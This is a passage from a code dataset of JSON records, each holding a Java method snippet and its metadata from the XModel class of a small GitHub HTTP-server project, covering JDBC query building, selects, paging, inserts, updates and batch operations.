logger.error(\"XModel.selectBySQL.SQLException:\" + sql, e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "selectBySQL", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "JSONArray", "snippet": "    public JSONArray selectBySQL(String sql, Object... data) {        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        try {            pstmt = conn.prepareStatement(sql);            if (data != null) {                for (int i = 0; i < data.length; i++) {                    pstmt.setObject(i + 1, data[i]);                }            }            logger.info(\"selectBySQL: \" + readOriginalSql(pstmt));            rs = pstmt.executeQuery();            return this.getJSONArray(rs);        } catch (SQLException e) {            logger.error(\"XModel.selectBySQL.SQLException: \" + readOriginalSql(pstmt), e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "readOriginalSql", "params": ["PreparedStatement"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String readOriginalSql(PreparedStatement pstmt) {        try {            Field delegate = pstmt.getClass().getSuperclass().getSuperclass().getDeclaredField(\"delegate\");            if (!delegate.isAccessible()) {                delegate.setAccessible(true);            }            Object stat = delegate.get(pstmt);            Method method = stat.getClass().getDeclaredMethod(\"asSql\");            if (!method.isAccessible()) {                method.setAccessible(true);            }            return (String) method.invoke(stat);        } catch (Exception e) {            e.printStackTrace();        }        return \"\";    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "selectBySQL", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "JSONArray", "snippet": "    public JSONArray selectBySQL(String sql) {        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        try {            pstmt = conn.prepareStatement(sql);            rs = pstmt.executeQuery();            logger.info(\"selectBySQL: \" + readOriginalSql(pstmt));            return this.getJSONArray(rs);        } catch (SQLException e) {            logger.error(\"XModel.selectBySQL.SQLException: \" + sql, e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "findBySQL", "params": ["String", "List<Object>"], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject findBySQL(String sql, List<Object> data) {        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        try {            pstmt = conn.prepareStatement(sql);            if (data != null) {                for (int i = 0; i < data.size(); i++) {                    pstmt.setObject(i + 1, data.get(i));                }            }            rs = pstmt.executeQuery();            logger.info(\"findBySQL: \" + readOriginalSql(pstmt));            return this.getJSONObject(rs);        } catch (SQLException e) {            logger.error(\"XModel.findBySQL.SQLException: \" + sql, e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "findBySQL", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject findBySQL(String sql, Object... data) {        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        try {            pstmt = conn.prepareStatement(sql);            if (data != null) {                for (int i = 0; i < data.length; i++) {                    pstmt.setObject(i + 1, data[i]);                }            }            rs = pstmt.executeQuery();            logger.info(\"findBySQL: \" + readOriginalSql(pstmt));            return this.getJSONObject(rs);        } catch (SQLException e) {            logger.error(\"XModel.findBySQL.SQLException: \" + sql, e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "findBySQL", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject findBySQL(String sql) {        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        try {            pstmt = conn.prepareStatement(sql);            rs = pstmt.executeQuery();            logger.info(\"findBySQL: \" + readOriginalSql(pstmt));            return this.getJSONObject(rs);        } catch (SQLException e) {            logger.error(\"XModel.findBySQL.SQLException: \" + sql, e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "executeByDDLSQL", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean executeByDDLSQL(String sql) {        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        try {            pstmt = conn.prepareStatement(sql);            int num = pstmt.executeUpdate();            return (num == 0);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.executeByDDLSQL.SQLException: \" + sql, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "executeBySQL", "params": ["String", "List<Object>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean executeBySQL(String sql, List<Object> data) {        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        try {            pstmt = conn.prepareStatement(sql);            if (data != null) {                for (int i = 0; i < data.size(); i++) {                    pstmt.setObject(i + 1, data.get(i));                }            }            int num = pstmt.executeUpdate();            return (num > 0);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.executeBySQL.SQLException: \" + sql, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "executeBySQL", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean executeBySQL(String sql, Object... data) {        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        try {            pstmt = conn.prepareStatement(sql);            if (data != null) {                for (int i = 0; i < data.length; i++) {                    pstmt.setObject(i + 1, data[i]);                }            }            int num = pstmt.executeUpdate();            return (num > 0);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.executeBySQL.SQLException: \" + sql, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "executeBatchBySQL", "params": ["String", "List<List>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean executeBatchBySQL(String sql, List<List<Object>> data) {        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        try {            if (isBadTransaction()) {                conn.setAutoCommit(false);            }            pstmt = conn.prepareStatement(sql);            List<Object> rowData = null;            for (int i = 0; i < data.size(); i++) {                rowData = data.get(i);                for (int j = 0, m = rowData.size(); j < m; j++) {                    pstmt.setObject(j + 1, rowData.get(j));                }                pstmt.addBatch();            }            int[] nums = pstmt.executeBatch();            if (isBadTransaction()) {                conn.commit();                conn.setAutoCommit(true);            }            return (nums.length > 0);        } catch (SQLException e) {            try {                conn.rollback();            } catch (SQLException e2) {                logger.error(\"XModel.insert.SQLException\", e2);            }            this.mException = e;            logger.error(\"XModel.executeBatchBySQL.SQLException: \" + sql, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "find", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject find() {        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        prepareStatement(SQLType.SELECT);        try {            pstmt = conn.prepareStatement(mStatementSQL);            setStatementParams(pstmt);            rs = pstmt.executeQuery();            logger.info(\"find: \" + readOriginalSql(pstmt));            return this.getJSONObject(rs);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.find.SQLException: \" + mStatementSQL, e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "select", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JSONArray", "snippet": "    public JSONArray select() {        return this.select(false);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "select", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "JSONArray", "snippet": "    public JSONArray select(boolean single) {        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        prepareStatement(SQLType.SELECT);        try {            pstmt = conn.prepareStatement(mStatementSQL);            setStatementParams(pstmt);            rs = pstmt.executeQuery();            logger.info(\"select: \" + readOriginalSql(pstmt));            return this.getJSONArray(rs, single);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.select.SQLException: \" + readOriginalSql(pstmt), e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "page", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject page(int pagenum, int pagesize) {        return page(pagenum, pagesize, false);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "page", "params": ["int", "int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject page(int pagenum, int pagesize, boolean single) {        this.limit((pagenum - 1) * pagesize, pagesize);        Connection conn = this.getConnection();        if (conn == null) {            return null;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        prepareStatement(SQLType.COUNT);        try {            pstmt = conn.prepareStatement(mStatementSQL);            setStatementParams(pstmt);            rs = pstmt.executeQuery();            logger.info(\"pageCount: \" + readOriginalSql(pstmt));            JSONObject json = this.getJSONObject(rs);            rs.close();            pstmt.close();            int total = json.getIntValue(\"total\");            JSONObject pageData = new JSONObject();            pageData.put(\"total\", total);            pageData.put(\"pagenum\", pagenum);            pageData.put(\"pagesize\", pagesize);            JSONArray data = null;            if (total > 0) {                prepareStatement(SQLType.SELECT);                pstmt = conn.prepareStatement(mStatementSQL);                setStatementParams(pstmt);                rs = pstmt.executeQuery();                logger.info(\"page: \" + readOriginalSql(pstmt));                data = this.getJSONArray(rs, single);            } else {                data = new JSONArray();            }            pageData.put(\"data\", data);            return pageData;        } catch (SQLException e) {            logger.error(\"XModel.page.SQLException: \" + mStatementSQL, e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "count", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int count() {        Connection conn = this.getConnection();        if (conn == null) {            return -1;        }        PreparedStatement pstmt = null;        ResultSet rs = null;        prepareStatement(SQLType.COUNT);        try {            pstmt = conn.prepareStatement(mStatementSQL);            setStatementParams(pstmt);            rs = pstmt.executeQuery();            JSONObject json = this.getJSONObject(rs);            return json.getIntValue(\"total\");        } catch (SQLException e) {            logger.error(\"XModel.select.SQLException: \" + mStatementSQL, e);        } finally {            this.closeConnection(rs, pstmt, conn);        }        return 0;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "update", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean update() {        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        prepareStatement(SQLType.UPDATE);        try {            pstmt = conn.prepareStatement(mStatementSQL);            setStatementParams(pstmt);            int num = pstmt.executeUpdate();            logger.info(\"XModel.update: {}\", readOriginalSql(pstmt));            return (num > 0);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.update.SQLException: \" + mStatementSQL, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "delete", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean delete() {        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        prepareStatement(SQLType.DELETE);        try {            pstmt = conn.prepareStatement(mStatementSQL);            setStatementParams(pstmt);            int num = pstmt.executeUpdate();            return (num > 0);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.delete.SQLException: \" + mStatementSQL, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "insert", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean insert() {        if (mValues.size() == 0) {            return false;        }        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        prepareStatement(SQLType.INSERT);        try {            pstmt = conn.prepareStatement(mStatementSQL);            for (int i = 0, n = mStatementParams.size(); i < n; i++) {                pstmt.setObject(i + 1, mStatementParams.get(i));            }            int num = pstmt.executeUpdate();            return (num > 0);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.insert.SQLException: \" + readOriginalSql(pstmt), e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "lastInsertId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long lastInsertId() {        if (!this.isBadTransaction()) {            Connection conn = this.getConnection();            if (conn == null) {                return 0;            }            PreparedStatement pstmt = null;            ResultSet rs = null;            try {                pstmt = conn.prepareStatement(\"SELECT LAST_INSERT_ID() AS `insertid`\");                rs = pstmt.executeQuery();                JSONObject json = this.getJSONObject(rs);                return json.getLongValue(\"insertid\");            } catch (SQLException e) {                this.mException = e;                logger.error(\"XModel.lastInsertId.SQLException\", e);            } finally {                this.closeConnection(null, pstmt, conn);            }        }        return 0;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "replace", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean replace() {        if (mValues.size() == 0) {            return false;        }        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        prepareStatement(SQLType.REPLACE);        try {            pstmt = conn.prepareStatement(mStatementSQL);            for (int i = 0, n = mStatementParams.size(); i < n; i++) {                pstmt.setObject(i + 1, mStatementParams.get(i));            }            int num = pstmt.executeUpdate();            return (num > 0);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.replace.SQLException: \" + mStatementSQL, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "insertUpdate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean insertUpdate() {        if (mValues.size() == 0) {            return false;        }        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        prepareStatement(SQLType.INSERT_UPDATE);        try {            pstmt = conn.prepareStatement(mStatementSQL);            for (int i = 0, n = mStatementParams.size(); i < n; i++) {                pstmt.setObject(i + 1, mStatementParams.get(i));            }            int num = pstmt.executeUpdate();            logger.info(\"XModel.insertUpdate: {}\", readOriginalSql(pstmt));            return (num > 0);        } catch (SQLException e) {            this.mException = e;            logger.error(\"XModel.insertUpdate.SQLException: \" + readOriginalSql(pstmt), e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "insertBatch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean insertBatch() {        if (mBatchValues.size() == 0) {            return false;        }        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        prepareStatement(SQLType.INSERT_BATCH);        try {            pstmt = conn.prepareStatement(mStatementSQL);            if (isBadTransaction()) {                conn.setAutoCommit(false);            }            List<Object> rowParams = null;            for (int i = 0, n = mBatchStatementParams.size(); i < n; i++) {                rowParams = mBatchStatementParams.get(i);                for (int j = 0, m = rowParams.size(); j < m; j++) {                    pstmt.setObject(j + 1, rowParams.get(j));                }                pstmt.addBatch();            }            pstmt.executeBatch();            if (isBadTransaction()) {                conn.commit();                conn.setAutoCommit(true);            }            return true;        } catch (SQLException e) {            try {                conn.rollback();            } catch (SQLException e2) {                logger.error(\"XModel.insertBatch.SQLException\", e2);            }            this.mException = e;            logger.error(\"XModel.insertBatch.SQLException: \" + mStatementSQL, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "insertUpdateBatch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean insertUpdateBatch() {        if (mBatchValues.size() == 0) {            return false;        }        Connection conn = this.getConnection();        if (conn == null) {            return false;        }        PreparedStatement pstmt = null;        prepareStatement(SQLType.INSERT_UPDATE_BATCH);        try {            pstmt = conn.prepareStatement(mStatementSQL);            if (isBadTransaction()) {                conn.setAutoCommit(false);            }            List<Object> rowParams = null;            for (int i = 0, n = mBatchStatementParams.size(); i < n; i++) {                rowParams = mBatchStatementParams.get(i);                for (int j = 0, m = rowParams.size(); j < m; j++) {                    pstmt.setObject(j + 1, rowParams.get(j));                }                pstmt.addBatch();            }            pstmt.executeBatch();            if (isBadTransaction()) {                conn.commit();                conn.setAutoCommit(true);            }            return true;        } catch (SQLException e) {            try {                conn.rollback();            } catch (SQLException e2) {                logger.error(\"XModel.insertUpdateBatch.SQLException\", e2);            }            this.mException = e;            logger.error(\"XModel.insertUpdateBatch.SQLException: \" + mStatementSQL, e);        } finally {            this.closeConnection(null, pstmt, conn);        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setStatementParams", "params": ["PreparedStatement"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setStatementParams(PreparedStatement pstmt) throws SQLException {        int idx = 0;        Object value = null;        StringBuilder tempSB = new StringBuilder();        for (int i = 0, n = mStatementParams.size(); i < n; i++) {            value = mStatementParams.get(i);            if (value instanceof JSONArray) {                JSONArray values = (JSONArray) value;                for (int j = 0, m = values.size(); j < m; j++) {                    idx = idx + 1;                    pstmt.setObject(idx, values.get(j));                    tempSB.append(values.get(j) + \", \");                }            } else if (value instanceof Object[]) {                Object[] values = (Object[]) value;                for (int j = 0, m = values.length; j < m; j++) {                    idx = idx + 1;                    pstmt.setObject(idx, values[j]);                    tempSB.append(values[j] + \", \");                }            } else {                idx = idx + 1;                pstmt.setObject(idx, value);                tempSB.append(value + \", \");            }        }        logger.info(\"XModel.StatementValues: \" + tempSB.toString());    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "prepareStatement", "params": ["SQLType"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void prepareStatement(SQLType type) {        StringBuilder sqlSB = new StringBuilder();        mStatementParams.clear();        if (type == SQLType.UPDATE) {            sqlSB.append(\"UPDATE `\" + tableName() + \"` SET \");            if (mValues.size() > 0) {                ClauseValue clause = null;                for (int i = 0, n = mValues.size(); i < n; i++) {                    clause = mValues.get(i);                    mStatementParams.add(clause.getValue());                    if (i > 0) {                        sqlSB.append(\",\");                    }                    sqlSB.append(clause.getPattern());                }            }            sqlSB.append(\" WHERE 1=1 \");            if (mWheres.size() > 0) {                ClauseWhere clause = null;                Object value = null;                for (int i = 0, n = mWheres.size(); i < n; i++) {                    clause = mWheres.get(i);                    value = clause.getValue();                    if (value != null) {                        mStatementParams.add(value);                    }                    sqlSB.append(\" AND \");                    sqlSB.append(clause.getPattern());                }            }        } else if (type == SQLType.SELECT) {            sqlSB.append(\"SELECT \");            if (mFields.size() > 0) {                if (mDistinct) {                    sqlSB.append(\" DISTINCT \");                }                String fieldstr = mFields.toString();                sqlSB.append(fieldstr.substring(1, fieldstr.length() - 1));            } else {                sqlSB.append(\" * \");            }            sqlSB.append(\" FROM `\" + tableName() + \"` \");            sqlSB.append(\" WHERE 1=1 \");            if (mWheres.size() > 0) {                ClauseWhere clause = null;                Object value = null;                for (int i = 0, n = mWheres.size(); i < n; i++) {                    clause = mWheres.get(i);                    value = clause.getValue();                    if (value != null) {                        mStatementParams.add(value);                    }                    sqlSB.append(\" AND \");                    sqlSB.append(clause.getPattern());                }            }            if (mGroup != null) {                sqlSB.append(mGroup);            }            if (mOrderList.size() > 0) {                StringBuilder orderSB = new StringBuilder();                orderSB.append(\" ORDER BY \");                int num = 0;                for (String name : mOrderList.keySet()) {                    if (num > 0) {                        orderSB.append(\",\");                    }                    orderSB.append(\" `\").append(name).append(\"` \");                    if (mOrderList.get(name)) {                        orderSB.append(\" DESC \");                    }                    num++;                }                sqlSB.append(orderSB.toString());            }            if (mLimit != null) {                sqlSB.append(mLimit);            }        } else if (type == SQLType.COUNT) {            sqlSB.append(\"SELECT COUNT(1) AS total \");            sqlSB.append(\" FROM `\" + tableName() + \"` \");            sqlSB.append(\" WHERE 1=1 \");            if (mWheres.size() > 0) {                ClauseWhere clause = null;                Object value = null;                for (int i = 0, n = mWheres.size(); i < n; i++) {                    clause = mWheres.get(i);                    value = clause.getValue();                    if (value != null) {                        mStatementParams.add(value);                    }                    sqlSB.append(\" AND \");                    sqlSB.append(clause.getPattern());                }            }        } else if (type == SQLType.INSERT) {            sqlSB.append(\"INSERT INTO `\" + tableName() + \"` (\");            ClauseValue clause = null;            StringBuilder patternSB = new StringBuilder();            for (int i = 0, n = mValues.size(); i < n; i++) {                clause = mValues.get(i);                mStatementParams.add(clause.getValue());                if (i > 0) {                    sqlSB.append(\",\");                    patternSB.append(\",\");                }                patternSB.append(\"?\");                sqlSB.append(clause.getKey());            }            sqlSB.append(\") VALUES (\" + patternSB.toString() + \")\");        } else if (type == SQLType.REPLACE) {            sqlSB.append(\"REPLACE INTO `\" + tableName() + \"` (\");            ClauseValue clause = null;            StringBuilder patternSB = new StringBuilder();            for (int i = 0, n = mValues.size(); i < n; i++) {                clause = mValues.get(i);                mStatementParams.add(clause.getValue());                if (i > 0) {                    sqlSB.append(\",\");                    patternSB.append(\",\");                }                patternSB.append(\"?\");                sqlSB.append(clause.getKey());            }            sqlSB.append(\") VALUES (\" + patternSB.toString() + \")\");        } else if (type == SQLType.INSERT_UPDATE) {            sqlSB.append(\"INSERT INTO `\" + tableName() + \"` (\");            ClauseValue clause = null;            StringBuilder patternSB = new StringBuilder();            for (int i = 0, n = mValues.size(); i < n; i++) {                clause = mValues.get(i);                mStatementParams.add(clause.getValue());                if (i > 0) {                    sqlSB.append(\",\");                    patternSB.append(\",\");                }                patternSB.append(\"?\");                sqlSB.append(clause.getKey());            }            sqlSB.append(\") VALUES (\" + patternSB.toString() + \")\");            sqlSB.append(\" ON DUPLICATE KEY UPDATE \");            String updateField = null;            ClauseValue upClause = null;            Object upField = null;            if (mUpdateFields.size() > 0) {                for (int i = 0, n = mUpdateFields.size(); i < n; i++) {                    if (i > 0) {                        sqlSB.append(\",\");                    }                    upField = mUpdateFields.get(i);                    if (upField instanceof ClauseValue) {                        upClause = (ClauseValue) upField;                        updateField = upClause.getKey();                        sqlSB.append(updateField).append(\"=\").append(updateField);                        sqlSB.append(upClause.calc == ValueCalc.add ? \"+?\" : upClause.calc == ValueCalc.sub ? \"-?\" : upClause.calc == ValueCalc.mul ? \"*?\" : \"/?\");                        mStatementParams.add(upClause.getValue());                    } else if (upField instanceof String) {                        updateField = \"`\" + upField + \"`\";                        sqlSB.append(updateField).append(\"=VALUES(\").append(updateField).append(\")\");                    }                }            } else {                for (int i = 0, n = mValues.size(); i < n; i++) {                    clause = mValues.get(i);                    if (i > 0) {                        sqlSB.append(\",\");                    }                    sqlSB.append(clause.getKey()).append(\"=VALUES(\").append(clause.getKey()).append(\")\");                }            }        } else if (type == SQLType.INSERT_BATCH) {            sqlSB.append(\"INSERT INTO `\" + tableName() + \"` (\");            ClauseValue clause = null;            List<ClauseValue> values = null;            List<Object> params = null;            StringBuilder patternSB = new StringBuilder();            for (int i = 0, n = mBatchValues.size(); i < n; i++) {                values = mBatchValues.get(i);                params = new ArrayList<Object>();                if (i == 0) {                    for (int j = 0, m = values.size(); j < m; j++) {                        clause = values.get(j);                        params.add(clause.getValue());                        if (j > 0) {                            sqlSB.append(\",\");                            patternSB.append(\",\");                        }                        patternSB.append(\"?\");                        sqlSB.append(clause.getKey());                    }                } else {                    for (int j = 0, m = values.size(); j < m; j++) {                        clause = values.get(j);                        params.add(clause.getValue());                    }                }                mBatchStatementParams.add(params);            }            sqlSB.append(\") VALUES (\" + patternSB.toString() + \")\");        } else if (type == SQLType.INSERT_UPDATE_BATCH) {            sqlSB.append(\"INSERT INTO `\" + tableName() + \"` (\");            ClauseValue clause = null;            List<ClauseValue> values = null;            List<Object> params = null;            StringBuilder patternSB = new StringBuilder();            for (int i = 0, n = mBatchValues.size(); i < n; i++) {                values = mBatchValues.get(i);                params = new ArrayList<Object>();                if (i == 0) {                    for (int j = 0, m = values.size(); j < m; j++) {                        clause = values.get(j);                        params.add(clause.getValue());                        if (j > 0) {                            sqlSB.append(\",\");                            patternSB.append(\",\");                        }                        patternSB.append(\"?\");                        sqlSB.append(clause.getKey());                    }                } else {                    for (int j = 0, m = values.size(); j < m; j++) {                        clause = values.get(j);                        params.add(clause.getValue());                    }                }                mBatchStatementParams.add(params);  